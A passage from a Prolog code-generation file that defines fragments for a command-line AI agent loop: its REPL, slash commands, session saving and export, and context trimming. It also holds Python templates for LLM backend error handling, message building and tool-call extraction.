sessions_dir(Dir) :- expand_file_name("~/.agent-loop/sessions", [Dir]).

').

prolog_fragment(agent_loop_entry, '%% Entry point with default options
agent_loop :- agent_loop([]).

%% Entry point with CLI args
agent_loop(Args) :-
    parse_cli_args(Args, Options),
    (member(backend(BName), Options), BName \\= none ->
        true
    ; BName = coro),
    create_backend(BName, Options, Backend),
    retractall(current_backend(_)),
    assert(current_backend(Backend)),
    (member(security_profile(Prof), Options), Prof \\= none ->
        set_security_profile(Prof)
    ; true),
    cost_tracker_init(main),
    ansi_format(bold, "uwsal — Prolog agent loop (backend: ~w)~n", [BName]),
    ansi_format(dim, "Type /help for commands, /exit to quit.~n", []),
    repl_loop.

').

prolog_fragment(agent_loop_repl_core, '%% Main read-eval-print loop
repl_loop :-
    current_backend(Backend),
    write("> "),
    flush_output,
    read_input_smart(Input),
    (Input = "/exit" -> write("Goodbye."), nl
    ; Input = "" -> repl_loop
    ; process_input(Input, Backend) -> repl_loop
    ; repl_loop).

%% Smart input reader with multi-line support
read_input_smart(Input) :-
    read_line_to_string(user_input, Line),
    (Line = end_of_file -> Input = "/exit"
    ; is_multiline_trigger(Line) ->
        get_multiline_delimiter(Line, Delim),
        read_multiline(Delim, [Line], Input)
    ; atom_string(Input, Line)
    ).

is_multiline_trigger(Line) :-
    (sub_string(Line, 0, 3, _, "```")
    ; sub_string(Line, 0, 3, _, "<<<")
    ; string_concat(_, "\\\\", Line)
    ).

get_multiline_delimiter(Line, Delim) :-
    (sub_string(Line, 0, 3, _, "```") -> Delim = "```"
    ; sub_string(Line, 0, 3, _, "<<<") -> Delim = "<<<"
    ; Delim = continuation
    ).

read_multiline(continuation, Acc, Input) :-
    last(Acc, LastLine),
    (string_concat(_, "\\\\", LastLine) ->
        read_line_to_string(user_input, Next),
        (Next = end_of_file ->
            atomic_list_concat(Acc, "\\n", Input)
        ;
            append(Acc, [Next], Acc2),
            read_multiline(continuation, Acc2, Input)
        )
    ;
        atomic_list_concat(Acc, "\\n", Input)
    ).
read_multiline(Delim, Acc, Input) :-
    Delim \\= continuation,
    read_line_to_string(user_input, Next),
    (Next = end_of_file ->
        atomic_list_concat(Acc, "\\n", Input)
    ; Next = Delim ->
        append(Acc, [Next], AllLines),
        atomic_list_concat(AllLines, "\\n", Input)
    ;
        append(Acc, [Next], Acc2),
        read_multiline(Delim, Acc2, Input)
    ).

').

prolog_fragment(agent_loop_process_input, '%% Process user input: slash command or LLM request
process_input(Input, Backend) :-
    (sub_string(Input, 0, 1, _, "/") ->
        %% Slash command — split into command and args
        (sub_string(Input, SpaceIdx, 1, _, " ") ->
            sub_string(Input, 0, SpaceIdx, _, CmdPart),
            AfterSpace is SpaceIdx + 1,
            sub_string(Input, AfterSpace, _, 0, ArgsPart)
        ;
            CmdPart = Input, ArgsPart = ""
        ),
        atom_string(CmdAtom, CmdPart),
        atom_string(ArgsAtom, ArgsPart),
        handle_slash_command(CmdAtom, ArgsAtom, Action),
        handle_action(Action, Backend)
    ;
        %% LLM request
        conversation(History),
        UserMsg = _{role: "user", content: Input},
        append(History, [UserMsg], Messages0),
        trim_context(Messages0, Messages),
        %% Build tool specs
        findall(ToolSpec, (
            tool_spec(TName, TProps),
            member(description(TDesc), TProps),
            build_tool_input_schema(TName, TSchema),
            ToolSpec = _{name: TName, description: TDesc, input_schema: TSchema}
        ), ToolSpecs),
        %% Check if streaming is enabled and backend supports it
        get_dict(spec, Backend, BSpec),
        member(resolve_type(RT), BSpec),
        (streaming(true), streaming_capable(RT) ->
            write("Assistant: "), flush_output,
            send_request_streaming(Backend, Messages, ToolSpecs, Response),
            nl, Streamed = true
        ;
            send_request(Backend, Messages, ToolSpecs, Response),
            Streamed = false
        ),
        handle_response(Backend, Response, Messages, Streamed)
    ).

').

prolog_fragment(agent_loop_response, '%% Handle LLM response, including tool calls
handle_response(Backend, Response, Messages, Streamed) :-
    (Streamed = false, get_dict(content, Response, Content), Content \\= "" ->
        write(Content), nl
    ; true),
    %% Track cost if usage data available
    (get_dict(usage, Response, Usage),
     get_dict(input_tokens, Usage, InTok),
     get_dict(output_tokens, Usage, OutTok),
     (InTok > 0 ; OutTok > 0) ->
        get_dict(spec, Backend, BSpec),
        (member(model(Model), BSpec) -> true ; Model = "unknown"),
        cost_tracker_add(main, Model, InTok, OutTok),
        %% Calibrate token estimation from actual usage
        (InTok > 0 ->
            foldl([M,A,T]>>(get_dict(content,M,MC) -> atom_length(MC,L), T is A+L ; T=A),
                  Messages, 0, TotalChars),
            update_token_calibration(TotalChars, InTok)
        ; true)
    ; true),
    (get_dict(tool_calls, Response, ToolCalls), ToolCalls \\= [] ->
        handle_tool_calls(Backend, ToolCalls, Messages, Response)
    ;
        (get_dict(content, Response, Content2) -> true ; Content2 = ""),
        AsstMsg = _{role: "assistant", content: Content2},
        append(Messages, [AsstMsg], NewMsgs),
        retractall(conversation(_)),
        assert(conversation(NewMsgs))
    ).

%% Execute tool calls and continue conversation
handle_tool_calls(Backend, ToolCalls, Messages, _) :-
    handle_tool_calls(Backend, ToolCalls, Messages, _, 1).

handle_tool_calls(Backend, ToolCalls, Messages, _AsstResponse, Iteration) :-
    %% Check iteration limit
    max_iterations(MaxIter),
    (MaxIter > 0, Iteration > MaxIter ->
        ansi_format(yellow, "~n[Paused after ~w iterations. Send a message to continue.]~n", [MaxIter]),
        AsstMsg = _{role: "assistant", content: "", tool_calls: ToolCalls},
        append(Messages, [AsstMsg], NewMsgs),
        retractall(conversation(_)),
        assert(conversation(NewMsgs))
    ;
        AsstMsg = _{role: "assistant", content: "", tool_calls: ToolCalls},
        append(Messages, [AsstMsg], Msgs1),
        execute_tool_calls(Backend, ToolCalls, ToolResults),
        append(Msgs1, ToolResults, Msgs2),
        findall(TS, (tool_spec(TN, TP), member(description(TD), TP),
            build_tool_input_schema(TN, TSch),
            TS = _{name: TN, description: TD, input_schema: TSch}), TSList),
        send_request(Backend, Msgs2, TSList, NextResponse),
        %% Track cost for tool-loop response
        (get_dict(usage, NextResponse, NUsage),
         get_dict(input_tokens, NUsage, NInTok),
         get_dict(output_tokens, NUsage, NOutTok),
         (NInTok > 0 ; NOutTok > 0) ->
            get_dict(spec, Backend, BSpec2),
            (member(model(NModel), BSpec2) -> true ; NModel = "unknown"),
            cost_tracker_add(main, NModel, NInTok, NOutTok)
        ; true),
        (get_dict(tool_calls, NextResponse, NextTCs), NextTCs \\= [] ->
            NextIter is Iteration + 1,
            handle_tool_calls(Backend, NextTCs, Msgs2, NextResponse, NextIter)
        ;
            handle_response(Backend, NextResponse, Msgs2, false)
        )
    ).

%% Execute a list of tool calls, collecting results
execute_tool_calls(_Backend, [], []).
execute_tool_calls(Backend, [TC|Rest], [Result|Results]) :-
    get_dict(name, TC, ToolName),
    get_dict(arguments, TC, Params),
    atom_string(ToolAtom, ToolName),
    describe_tool_call(Backend, ToolAtom, Params, Desc),
    ansi_format(cyan, "[tool] ~w~n", [Desc]),
    (confirm_destructive(ToolAtom, true) ->
        execute_tool(ToolAtom, Params, ToolResult),
        (ToolResult = ok(Output) -> Content = Output ; ToolResult = error(Err) -> Content = Err),
        (get_dict(id, TC, TCID) -> true ; TCID = ""),
        Result = _{role: "tool", content: Content, tool_call_id: TCID}
    ;
        Result = _{role: "tool", content: "Execution denied by user", tool_call_id: ""}
    ),
    execute_tool_calls(Backend, Rest, Results).

').

prolog_fragment(agent_loop_actions, '%% Handle slash command actions
handle_action(exit, _) :- write("Goodbye."), nl, halt.
handle_action(clear, _) :-
    retractall(conversation(_)),
    assert(conversation([])),
    write("Context cleared."), nl.
handle_action(help, _) :-
    ansi_format(bold, "Available commands:~n", []),
    findall(Group-Cmds, slash_command_group(Group, Cmds), Groups),
    maplist([Group-Cmds]>>(
        ansi_format(bold, "~n  ~w:~n", [Group]),
        maplist([CmdName]>>(
            slash_command(CmdName, _, Opts, Help),
            (member(help_display(Disp), Opts) -> true ; format(atom(Disp), "/~w", [CmdName])),
            format("    ~w~t~30| ~w~n", [Disp, Help])
        ), Cmds)
    ), Groups).
handle_action(status, Backend) :-
    get_dict(name, Backend, BName),
    conversation(Msgs),
    length(Msgs, MsgCount),
    cost_tracker_format(main, CostStr),
    format("Backend: ~w~nMessages: ~w~nCosts: ~w~n", [BName, MsgCount, CostStr]).
handle_action(call_handler(''_handle_cost_command'', _), _) :-
    cost_tracker_format(main, CostStr),
    write(CostStr), nl.
handle_action(call_handler(''_handle_backend_command'', Args), Backend) :-
    (Args = "" ->
        get_dict(name, Backend, BName),
        format("Current backend: ~w~n", [BName]),
        write("Available backends:"), nl,
        findall(N, backend_factory(N, _), Ns),
        maplist([N]>>(format("  ~w~n", [N])), Ns)
    ;
        atom_string(TargetName, Args),
        (backend_factory(TargetName, _) ->
            create_backend(TargetName, [], NewBackend),
            retractall(current_backend(_)),
            assert(current_backend(NewBackend)),
            format("Switched to backend: ~w~n", [TargetName])
        ;
            format("Unknown backend: ~w~nAvailable: ", [TargetName]),
            findall(N, backend_factory(N, _), Names),
            atomic_list_concat(Names, '', '', NamesStr),
            write(NamesStr), nl
        )
    ).
handle_action(call_handler(''_handle_iterations_command'', Args), _) :-
    (Args = "" ->
        max_iterations(N),
        (N =:= 0 -> write("Max iterations: unlimited")
        ; format("Max iterations: ~w", [N])), nl
    ;
        atom_number(Args, N),
        retractall(max_iterations(_)),
        assert(max_iterations(N)),
        (N =:= 0 -> write("Max iterations: unlimited")
        ; format("Max iterations set to ~w", [N])), nl
    ).
handle_action(call_handler(''_handle_stream_command'', _), _) :-
    streaming(Current),
    (Current = true -> New = false ; New = true),
    retractall(streaming(_)),
    assert(streaming(New)),
    (New = true -> Status = enabled ; Status = disabled),
    format("[Streaming ~w]~n", [Status]).
handle_action(call_handler(''_handle_model_command'', Args), _) :-
    current_backend(Backend),
    get_dict(spec, Backend, Spec),
    (Args = "" ->
        (member(model(M), Spec) -> format("Current model: ~w~n", [M])
        ; write("No model set in current backend"), nl)
    ;
        atom_string(_, Args),
        (select(model(_), Spec, Rest) ->
            NewSpec = [model(Args)|Rest]
        ;
            NewSpec = [model(Args)|Spec]
        ),
        put_dict(spec, Backend, NewSpec, NewBackend),
        retractall(current_backend(_)),
        assert(current_backend(NewBackend)),
        format("Model switched to: ~w~n", [Args])
    ).
handle_action(call_handler(''_handle_tokens_command'', _), _) :-
    conversation(Msgs),
    length(Msgs, NMsgs),
    chars_per_token(CPT),
    foldl([M,A,T]>>(get_dict(content,M,C) -> atom_length(C,L), T is A+L ; T=A),
          Msgs, 0, TotalChars),
    Tokens is round(TotalChars / CPT),
    context_max_tokens(Limit),
    format("Context: ~w tokens (est.) / ~w limit (~w messages, ~1f chars/token)~n",
           [Tokens, Limit, NMsgs, CPT]).
handle_action(call_handler(''_handle_aliases_command'', _), _) :-
    write("Command aliases:"), nl,
    findall(Alias-Target, command_alias(Alias, Target), AliasPairs),
    maplist([Alias-Target]>>(
        format("  /~w -> /~w~n", [Alias, Target])
    ), AliasPairs).
handle_action(call_handler(''_handle_history_command'', Args), _) :-
    (Args = "" -> N = 10 ; atom_number(Args, N)),
    conversation(Msgs),
    length(Msgs, Len),
    Start is max(0, Len - N),
    format("~nLast ~w messages (~w total):~n", [N, Len]),
    show_messages(Msgs, Start, 0).
handle_action(call_handler(''_handle_delete_command'', Args), _) :-
    (Args = "" ->
        write("Usage: /delete <index> or /delete <start>-<end>"), nl
    ;
        conversation(Msgs),
        %% Save undo state
        retractall(conversation_undo(_)),
        assert(conversation_undo(Msgs)),
        (sub_string(Args, DashIdx, 1, _, "-") ->
            sub_string(Args, 0, DashIdx, _, StartStr),
            AfterDash is DashIdx + 1,
            sub_string(Args, AfterDash, _, 0, EndStr),
            atom_number(StartStr, Start),
            atom_number(EndStr, End)
        ;
            atom_number(Args, Start),
            End = Start
        ),
        length(Msgs, Len),
        (Start >= 0, End < Len, Start =< End ->
            delete_range(Msgs, Start, End, 0, NewMsgs),
            retractall(conversation(_)),
            assert(conversation(NewMsgs)),
            Deleted is End - Start + 1,
            format("Deleted ~w message(s).~n", [Deleted])
        ;
            format("Invalid range. Messages: 0-~w~n", [Len])
        )
    ).
handle_action(call_handler(''_handle_undo_command'', _), _) :-
    (conversation_undo(OldMsgs) ->
        conversation(Current),
        retractall(conversation(_)),
        assert(conversation(OldMsgs)),
        retractall(conversation_undo(_)),
        assert(conversation_undo(Current)),
        length(OldMsgs, Len),
        format("Restored conversation (~w messages). /undo again to swap back.~n", [Len])
    ;
        write("Nothing to undo."), nl
    ).
handle_action(call_handler(''_handle_edit_command'', Args), _) :-
    (Args = "" ->
        write("Usage: /edit <index> <new content>"), nl
    ;
        (sub_string(Args, SpIdx, 1, _, " ") ->
            sub_string(Args, 0, SpIdx, _, IdxStr),
            AfterSp is SpIdx + 1,
            sub_string(Args, AfterSp, _, 0, NewContent)
        ;
            write("Usage: /edit <index> <new content>"), nl, fail
        ),
        atom_number(IdxStr, Idx),
        conversation(Msgs),
        length(Msgs, Len),
        (Idx >= 0, Idx < Len ->
            retractall(conversation_undo(_)),
            assert(conversation_undo(Msgs)),
            replace_at(Msgs, Idx, NewContent, 0, NewMsgs),
            retractall(conversation(_)),
            assert(conversation(NewMsgs)),
            format("Edited message ~w.~n", [Idx])
        ;
            format("Invalid index. Messages: 0-~w~n", [Len])
        )
    ).
handle_action(call_handler(''_handle_replay_command'', Args), Backend) :-
    (Args = "" ->
        write("Usage: /replay <index>"), nl
    ;
        atom_number(Args, Idx),
        conversation(Msgs),
        length(Msgs, Len),
        (Idx >= 0, Idx < Len ->
            nth0(Idx, Msgs, Msg),
            get_dict(content, Msg, Content),
            format("Replaying message ~w: ~w~n", [Idx, Content]),
            process_input(Content, Backend)
        ;
            format("Invalid index. Messages: 0-~w~n", [Len])
        )
    ).
handle_action(call_handler(''_handle_save_command'', Args), Backend) :-
    conversation(Msgs),
    get_dict(name, Backend, BName),
    length(Msgs, MsgCount),
    get_time(Now), stamp_date_time(Now, DT, local),
    format_time(atom(SessionId), "%Y%m%d_%H%M%S", DT),
    (Args = "" -> Name = SessionId ; atom_string(Name, Args)),
    sessions_dir(SDir),
    make_directory_path(SDir),
    format(atom(FileName), "~w/~w.json", [SDir, SessionId]),
    SessionData = _{metadata: _{id: SessionId, name: Name, backend: BName, message_count: MsgCount}, messages: Msgs},
    setup_call_cleanup(
        open(FileName, write, Out),
        json_write_dict(Out, SessionData, []),
        close(Out)),
    format("Saved session: ~w (~w messages)~n", [SessionId, MsgCount]).
handle_action(call_handler(''_handle_load_command'', Args), _) :-
    (Args = "" ->
        write("Usage: /load <session_id>"), nl
    ;
        atom_string(SessionId, Args),
        sessions_dir(SDir),
        format(atom(FileName), "~w/~w.json", [SDir, SessionId]),
        (exists_file(FileName) ->
            setup_call_cleanup(
                open(FileName, read, In),
                json_read_dict(In, Data),
                close(In)),
            get_dict(messages, Data, Msgs),
            retractall(conversation(_)),
            assert(conversation(Msgs)),
            length(Msgs, Len),
            (get_dict(metadata, Data, Meta), get_dict(name, Meta, Name) -> true ; Name = SessionId),
            format("Loaded session: ~w (~w messages)~n", [Name, Len])
        ;
            format("Session not found: ~w~n", [SessionId])
        )
    ).
handle_action(call_handler(''_handle_sessions_command'', _), _) :-
    sessions_dir(SDir),
    (exists_directory(SDir) ->
        directory_files(SDir, AllFiles),
        include(json_file, AllFiles, JsonFiles),
        (JsonFiles = [] ->
            write("No saved sessions."), nl
        ;
            write("Saved sessions:"), nl,
            maplist([F]>>(
                format(atom(FullPath), "~w/~w", [SDir, F]),
                catch((
                    setup_call_cleanup(
                        open(FullPath, read, In),
                        json_read_dict(In, Data),
                        close(In)),
                    get_dict(metadata, Data, Meta),
                    get_dict(id, Meta, Id),
                    get_dict(name, Meta, Name),
                    get_dict(message_count, Meta, MC),
                    format("  ~w: ~w (~w msgs)~n", [Id, Name, MC])
                ), _, (
                    file_name_extension(Base, _, F),
                    format("  ~w: (unreadable)~n", [Base])
                ))
            ), JsonFiles)
        )
    ; write("No saved sessions."), nl).
handle_action(call_handler(''_handle_format_command'', Args), _) :-
    (Args = "" ->
        current_format(Fmt),
        format("Current format: ~w~nAvailable: plain, markdown, json, xml~n", [Fmt])
    ;
        atom_string(NewFmt, Args),
        (member(NewFmt, [plain, markdown, json, xml]) ->
            retractall(current_format(_)),
            assert(current_format(NewFmt)),
            format("Format set to: ~w~n", [NewFmt])
        ;
            format("Unknown format: ~w~nAvailable: plain, markdown, json, xml~n", [NewFmt])
        )
    ).
handle_action(call_handler(''_handle_export_command'', Args), _) :-
    (Args = "" ->
        write("Usage: /export <path> (.md, .html, .json, .txt)"), nl
    ;
        atom_string(FilePath, Args),
        conversation(Msgs),
        length(Msgs, Len),
        file_name_extension(_, Ext, FilePath),
        (export_conversation(Ext, Msgs, Content) ->
            setup_call_cleanup(
                open(FilePath, write, Out),
                write(Out, Content),
                close(Out)),
            format("Exported ~w messages to ~w~n", [Len, FilePath])
        ;
            format("Unsupported format: .~w (use .md, .html, .json, .txt)~n", [Ext])
        )
    ).
handle_action(call_handler(''_handle_search_command'', Args), _) :-
    (Args = "" ->
        write("Usage: /search <query>"), nl
    ;
        sessions_dir(SDir),
        (exists_directory(SDir) ->
            directory_files(SDir, AllFiles),
            include(json_file, AllFiles, JsonFiles),
            atom_string(Query, Args),
            format("Search results for ''~w'':~n", [Query]),
            search_sessions(SDir, JsonFiles, Query, 0, Found),
            (Found =:= 0 -> format("  No results for: ~w~n", [Query]) ; true)
        ;
            write("No sessions directory found."), nl
        )
    ).
handle_action(call_handler(''_handle_templates_command'', _), _) :-
    write("No templates loaded."), nl.
handle_action(not_a_command, _) :- write("Unknown command."), nl.
handle_action(unknown(Cmd), _) :- format("Unknown command: /~w~n", [Cmd]).
handle_action(call_handler(Handler, _Args), _) :-
    format("Handler ~w not yet implemented in Prolog target.~n", [Handler]).

').

prolog_fragment(agent_loop_helpers, '%% Show conversation messages from index Start
show_messages([], _, _).
show_messages([Msg|Rest], Start, Idx) :-
    (Idx >= Start ->
        get_dict(role, Msg, Role),
        get_dict(content, Msg, Content),
        (atom_length(Content, CLen), CLen > 80 ->
            sub_atom(Content, 0, 80, _, Preview),
            format("  [~w] ~w: ~w...~n", [Idx, Role, Preview])
        ;
            format("  [~w] ~w: ~w~n", [Idx, Role, Content])
        )
    ; true),
    NextIdx is Idx + 1,
    show_messages(Rest, Start, NextIdx).

%% Delete messages in index range [Start, End]
delete_range([], _, _, _, []).
delete_range([_|Rest], Start, End, Idx, Result) :-
    Idx >= Start, Idx =< End, !,
    NextIdx is Idx + 1,
    delete_range(Rest, Start, End, NextIdx, Result).
delete_range([H|Rest], Start, End, Idx, [H|Result]) :-
    NextIdx is Idx + 1,
    delete_range(Rest, Start, End, NextIdx, Result).

%% Replace content of message at index Idx
replace_at([], _, _, _, []).
replace_at([Msg|Rest], Target, NewContent, Idx, [NewMsg|Result]) :-
    Idx =:= Target, !,
    put_dict(content, Msg, NewContent, NewMsg),
    NextIdx is Idx + 1,
    replace_at(Rest, Target, NewContent, NextIdx, Result).
replace_at([H|Rest], Target, NewContent, Idx, [H|Result]) :-
    NextIdx is Idx + 1,
    replace_at(Rest, Target, NewContent, NextIdx, Result).

%% Filter for .json files
json_file(F) :- file_name_extension(_, json, F).

').

prolog_fragment(agent_loop_export_search, '%% Export conversation to different formats
export_conversation(json, Msgs, Content) :-
    with_output_to(string(Content), json_write_dict(current_output, Msgs, [])).
export_conversation(md, Msgs, Content) :-
    with_output_to(string(Content), (
        write("# Conversation\\n\\n"),
        maplist([Msg]>>(
            get_dict(role, Msg, Role),
            get_dict(content, Msg, C),
            (Role = "user" -> write("**You:**") ; write("**Assistant:**")),
            nl, nl, write(C), nl, nl
        ), Msgs)
    )).
export_conversation(txt, Msgs, Content) :-
    with_output_to(string(Content), (
        maplist([Msg]>>(
            get_dict(role, Msg, Role),
            get_dict(content, Msg, C),
            format("~w: ~w~n~n", [Role, C])
        ), Msgs)
    )).
export_conversation(html, Msgs, Content) :-
    with_output_to(string(Content), (
        write("<html><body>\\n"),
        maplist([Msg]>>(
            get_dict(role, Msg, Role),
            get_dict(content, Msg, C),
            format("<div class=\\"~w\\"><b>~w:</b><p>~w</p></div>\\n", [Role, Role, C])
        ), Msgs),
        write("</body></html>\\n")
    )).

%% Search across saved session files
search_sessions(_, [], _, Found, Found).
search_sessions(SDir, [F|Rest], Query, Acc, Found) :-
    format(atom(Path), "~w/~w", [SDir, F]),
    catch((
        setup_call_cleanup(open(Path, read, In), json_read_dict(In, Data), close(In)),
        get_dict(messages, Data, Msgs),
        get_dict(metadata, Data, Meta),
        get_dict(id, Meta, SessId),
        search_messages(SessId, Msgs, Query, Acc, Acc1)
    ), _, Acc1 = Acc),
    search_sessions(SDir, Rest, Query, Acc1, Found).

search_messages(_, [], _, Acc, Acc).
search_messages(SessId, [Msg|Rest], Query, Acc, Found) :-
    get_dict(content, Msg, Content),
    get_dict(role, Msg, Role),
    (sub_string(Content, _, _, _, Query) ->
        (Role = "user" -> RLabel = "You" ; RLabel = "Asst"),
        (string_length(Content, CL), CL > 60 ->
            sub_string(Content, 0, 60, _, Snippet),
            format("  [~w] ~w: ~w...~n", [SessId, RLabel, Snippet])
        ;
            format("  [~w] ~w: ~w~n", [SessId, RLabel, Content])
        ),
        Acc1 is Acc + 1
    ; Acc1 = Acc),
    search_messages(SessId, Rest, Query, Acc1, Found).

').

prolog_fragment(agent_loop_context, '%% update_token_calibration(+CharCount, +TokenCount) — adjust chars_per_token ratio
update_token_calibration(CharCount, TokenCount) :-
    (TokenCount > 0, CharCount > 0 ->
        chars_per_token(OldRatio),
        Observed is CharCount / TokenCount,
        NewRatio is 0.9 * OldRatio + 0.1 * Observed,
        retractall(chars_per_token(_)),
        assert(chars_per_token(NewRatio))
    ; true).

%% Context sliding — trim messages by count and estimated tokens
%% Preserves leading system message if present
trim_context(Messages, Trimmed) :-
    (Messages = [SysMsg|Rest], get_dict(role, SysMsg, "system") ->
        HasSys = true, Body = Rest
    ;   HasSys = false, Body = Messages),
    context_max_messages(MaxMsgs),
    (HasSys = true -> EffMax is MaxMsgs - 1 ; EffMax = MaxMsgs),
    length(Body, Len),
    (Len > EffMax ->
        Drop is Len - EffMax,
        length(Prefix, Drop),
        append(Prefix, Kept, Body)
    ;   Kept = Body),
    context_max_tokens(MaxTokens),
    (HasSys = true ->
        msg_tokens(SysMsg, 0, SysTok),
        Budget is MaxTokens - SysTok,
        trim_by_tokens(Kept, Budget, TrimmedBody),
        Trimmed = [SysMsg|TrimmedBody]
    ;   trim_by_tokens(Kept, MaxTokens, Trimmed)).

trim_by_tokens(Msgs, MaxTokens, Trimmed) :-
    estimate_tokens(Msgs, Total),
    (Total > MaxTokens ->
        Msgs = [_|Rest],
        trim_by_tokens(Rest, MaxTokens, Trimmed)
    ; Trimmed = Msgs).

estimate_tokens(Msgs, Total) :-
    foldl(msg_tokens, Msgs, 0, Total).

msg_tokens(Msg, Acc, Total) :-
    (get_dict(content, Msg, Content) ->
        atom_length(Content, Len),
        chars_per_token(CPT),
        Tokens is round(Len / CPT)
    ; Tokens = 0),
    Total is Acc + Tokens.
').



%% --- Fragment: _format_prompt (shared by 5 CLI backends) ---

py_fragment(format_prompt, '    def _format_prompt(self, message: str, context: list[dict]) -> str:
        """Format message with conversation context."""
        if not context:
            return message

        history_lines = []
        for msg in context[-6:]:
            role = "User" if msg.get(\'role\') == \'user\' else "Assistant"
            content = msg.get(\'content\', \'\')
            if len(content) > 500:
                content = content[:500] + "..."
            history_lines.append(f"{role}: {content}")

        history = "\\n".join(history_lines)

        return f"""Previous conversation:
{history}

Current request: {message}"""
').

%% --- Fragment: Error handlers ---

py_fragment(error_handler_cli, '        except subprocess.TimeoutExpired:
            {{on_timeout}}return AgentResponse(
                content={{timeout_msg}},
                tokens={}
            )
        except FileNotFoundError:
            return AgentResponse(
                content=f"[Error: Command \'{self.command}\' not found. {{install_hint}}]",
                tokens={}
            )
        except Exception as e:
            return AgentResponse(
                content=f"[Error: {e}]",
                tokens={}
            )
').

py_fragment(error_handler_api_sdk, '        except {{sdk}}.APIError as e:
            return AgentResponse(
                content=f"[API Error: {e}]",
                tokens={}
            )
        except Exception as e:
            return AgentResponse(
                content=f"[Error: {e}]",
                tokens={}
            )
').

py_fragment(error_handler_urllib, '        except HTTPError as e:
            error_body = e.read().decode(\'utf-8\', errors=\'replace\')
            try:
                err_data = json.loads(error_body)
                err_msg = err_data.get(\'error\', {}).get(\'message\', error_body[:200])
            except json.JSONDecodeError:
                err_msg = error_body[:200]
            return AgentResponse(
                content=f"[API Error {e.code}: {err_msg}]",
                tokens={}
            )
        except URLError as e:
            return AgentResponse(
                content=f"[Network Error: {e.reason}]",
                tokens={}
            )
        except Exception as e:
            return AgentResponse(
                content=f"[Error: {e}]",
                tokens={}
            )
').

%% --- Fragment: SDK import guard ---

py_fragment(sdk_import_guard, '# Try to import {{sdk}}, but don\'t fail if not installed
try:
    import {{sdk}}
    HAS_{{SDK_UPPER}} = True
except ImportError:
    HAS_{{SDK_UPPER}} = False

').

py_fragment(sdk_init_guard, '        if not HAS_{{SDK_UPPER}}:
            raise ImportError(
                "{{sdk}} package not installed. "
                "Install with: pip install {{sdk}}"
            )

').

%% --- Fragment: API key validation ---

py_fragment(api_key_from_env, '        # Get API key from parameter or environment
        self.api_key = api_key or os.environ.get(\'{{env_var}}\')
        if not self.api_key:
            raise ValueError(
                "API key required. Set {{env_var}} environment variable "
                "or pass api_key parameter."
            )
').

%% --- Fragment: supports_streaming ---

py_fragment(supports_streaming_true, '    def supports_streaming(self) -> bool:
        """{{backend_name}} supports streaming."""
        return True
').

%% --- Fragment: name property ---

py_fragment(name_property, '    @property
    def name(self) -> str:
        return f"{{display_name}}"
').

%% --- Fragment family: Messages array builders ---
%% Four variants for different API message formats:
%%   messages_builder_system     — system as first message, simple (OpenAI API)
%%   messages_builder_openrouter — system first, handles tool_calls + dedup (OpenRouter)
%%   messages_builder_anthropic  — no system in messages, Anthropic passes separately
%%   messages_builder_ollama     — conditional system, explicit current message append
%% Selected per-backend via generate_backend_full/3.

py_fragment(messages_builder_system, '        # Build messages array
        messages = [
            {"role": "system", "content": self.system_prompt}
        ]

        # Add context messages
        for msg in context:
            if msg.get(\'role\') in (\'user\', \'assistant\'):
                messages.append({
                    "role": msg[\'role\'],
                    "content": msg[\'content\']
                })
').

py_fragment(messages_builder_openrouter, '        # Build messages array
        messages = [{"role": "system", "content": self.system_prompt}]

        for msg in context:
            role = msg.get(\'role\')
            if role == \'tool\':
                messages.append({
                    "role": "tool",
                    "tool_call_id": msg.get(\'tool_call_id\', \'\'),
                    "content": msg[\'content\'],
                })
            elif role == \'assistant\' and msg.get(\'tool_calls\'):
                messages.append({
                    "role": "assistant",
                    "content": msg.get(\'content\') or \'\',
                    "tool_calls": msg[\'tool_calls\'],
                })
            elif role in (\'user\', \'assistant\'):
                messages.append({"role": role, "content": msg[\'content\']})

        # Add current message (only if non-empty and not already in context)
        if message and (not context or context[-1].get(\'content\') != message):
            messages.append({"role": "user", "content": message})
').

%% --- Fragment: Messages array builder (Anthropic-style, no system in messages) ---

py_fragment(messages_builder_anthropic, '        # Build messages array
        messages = []

        # Add context messages
        for msg in context:
            if msg.get(\'role\') in (\'user\', \'assistant\'):
                messages.append({
                    "role": msg[\'role\'],
                    "content": msg[\'content\']
                })

        # Note: current message is already in context (added by agent_loop)
').

%% --- Fragment: Ollama messages builder (with system prompt) ---

py_fragment(messages_builder_ollama, '        # Build messages array
        messages = []

        # Add system prompt
        if self.system_prompt:
            messages.append({
                "role": "system",
                "content": self.system_prompt
            })

        # Add context messages
        for msg in context:
            if msg.get(\'role\') in (\'user\', \'assistant\'):
                messages.append({
                    "role": msg[\'role\'],
                    "content": msg[\'content\']
                })

        # Add current message
        messages.append({
            "role": "user",
            "content": message
        })
').

%% --- Fragment: OpenAI-style tool call extraction ---

py_fragment(extract_tool_calls_openai, '    def _extract_tool_calls(self, response) -> list[ToolCall]:
        """Extract tool calls from response."""
        tool_calls = []

        if not response.choices or len(response.choices) == 0:
            return tool_calls

        choice = response.choices[0]
        if not choice.message or not choice.message.tool_calls:
            return tool_calls

        for tc in choice.message.tool_calls:
            if tc.type == "function":
                import json
                try:
                    arguments = json.loads(tc.function.arguments)
                except json.JSONDecodeError:
                    arguments = {"raw": tc.function.arguments}

                tool_calls.append(ToolCall(
                    name=tc.function.name,
                    arguments=arguments,
                    id=tc.id
                ))

        return tool_calls
').

%% --- Fragment: Anthropic-style tool call extraction ---

py_fragment(extract_tool_calls_anthropic, '    def _extract_tool_calls(self, response) -> list[ToolCall]:
        """Extract tool use blocks from response."""
        tool_calls = []

        for block in response.content:
            if hasattr(block, \'type\') and block.type == \'tool_use\':
                tool_calls.append(ToolCall(
                    name=block.name,
                    arguments=block.input,
                    id=block.id
                ))

        return tool_calls
').

%% --- Fragments describe_tool_call_* deleted: now generated from tool_description/5 facts ---

%% --- Fragment: _clean_output (simple, for ollama_cli) ---

py_fragment(clean_output_simple, '    def _clean_output(self, output: str) -> str:
        """Clean up output."""
        result = output.strip()

        # Remove common prefixes
        for prefix in [\'A:\', \'Assistant:\']:
            if result.startswith(prefix):
                result = result[len(prefix):].strip()
                break

        return result
').

%% --- Fragment: list_models (CLI variant) ---

py_fragment(list_models_cli, '    def list_models(self) -> list[str]:
        """List available models using \'ollama list\'."""
        try:
            result = subprocess.run(
                [self.command, "list"],
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode == 0:
                lines = result.stdout.strip().split(\'\\n\')[1:]  # Skip header
                return [line.split()[0] for line in lines if line.strip()]
        except Exception:
            pass
        return []
').

%% --- Fragment: list_models (API variant) ---

